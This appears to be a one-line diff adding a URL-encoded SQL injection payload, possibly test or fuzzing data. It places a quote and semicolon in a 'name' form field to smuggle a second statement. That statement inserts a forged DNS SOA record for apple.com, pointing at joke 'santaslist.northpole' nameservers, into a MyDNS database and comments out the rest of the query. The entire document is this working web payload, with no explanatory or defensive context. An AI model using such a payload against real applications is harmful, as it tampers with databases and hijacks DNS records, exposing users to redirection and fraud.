@@ -1,0 +1,1 @@
+name=%27%3Binsert+into+mydns.soa+%28origin%2Cns%2Cmbox%29+values+%28%22apple.com%22%2C%22ns1.santaslist.northpole%22%2C%22root.santaslist.northpole%22%29+%23
